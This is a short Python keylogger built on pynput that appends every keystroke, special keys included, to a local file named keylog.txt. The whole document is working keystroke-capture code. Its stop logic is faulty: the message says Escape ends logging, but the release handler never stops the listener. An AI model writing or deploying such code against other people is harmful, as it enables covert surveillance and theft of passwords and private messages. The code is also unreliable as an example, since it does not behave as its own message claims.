from pynput import keyboard

#File to store the logged keystrokes
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function triggered when a key is pressed.
    """
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        #Handle special keys (e.g., Shift, Ctrl)
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    """
    Callback function when a key is released.
    """
    if key == keyboard.Key.esc:
        return  
    
def main():
    print("Keylogger started. Press 'Escape' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

main()